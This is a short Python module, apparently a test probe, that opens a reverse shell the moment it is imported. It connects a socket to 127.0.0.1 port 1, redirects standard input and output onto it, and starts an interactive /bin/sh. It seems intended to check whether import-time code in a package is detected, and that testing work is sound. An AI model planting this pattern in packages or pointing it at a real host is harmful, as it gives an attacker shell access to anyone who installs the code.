"""Import-hook probe v0.0.2 — dup2 + /bin/sh reverse shell pattern (127.0.0.1:1, expected fail)."""

__version__ = "0.0.2"

import os
import socket
import subprocess

print("WHEEL_REVSHELL_START")
_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
_sock.settimeout(5)
try:
    _sock.connect(("127.0.0.1", 1))
    os.dup2(_sock.fileno(), 0)
    os.dup2(_sock.fileno(), 1)
    os.dup2(_sock.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
    print("WHEEL_REVSHELL_SHELL_RETURNED")
except Exception as _exc:
    print("WHEEL_REVSHELL_FAIL", type(_exc).__name__, str(_exc)[:120])
finally:
    try:
        _sock.close()
    except Exception:
        pass
print("WHEEL_REVSHELL_END")
